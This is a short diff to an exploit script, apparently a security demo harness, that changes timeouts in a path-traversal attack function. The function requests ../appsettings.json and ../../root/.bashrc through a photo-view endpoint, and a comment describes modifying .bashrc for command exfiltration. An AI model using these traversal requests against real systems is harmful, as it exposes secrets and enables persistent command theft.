@@ -1238,11 +1238,11 @@ def run_path_traversal_exploit(session):
     log_exploit_output("Executing path traversal exploit")
     
     # Attempt to read appsettings.json via path traversal
-    r = session.get(f"{cargo_cats_url}/api/photos/view?path=../appsettings.json", timeout=5)
+    r = session.get(f"{cargo_cats_url}/api/photos/view?path=../appsettings.json", timeout=30)
     log_exploit_output(f"Path traversal exploit (../appsettings.json) response status: {r.status_code}")
     
     # Attempt to read root's bashrc
-    r = session.get(f"{cargo_cats_url}/api/photos/view?path=../../root/.bashrc", timeout=5)
+    r = session.get(f"{cargo_cats_url}/api/photos/view?path=../../root/.bashrc", timeout=30)
     log_exploit_output(f"Path traversal exploit (../../root/.bashrc) response status: {r.status_code}")
     
     # Save bashrc content and modify it for command exfiltration
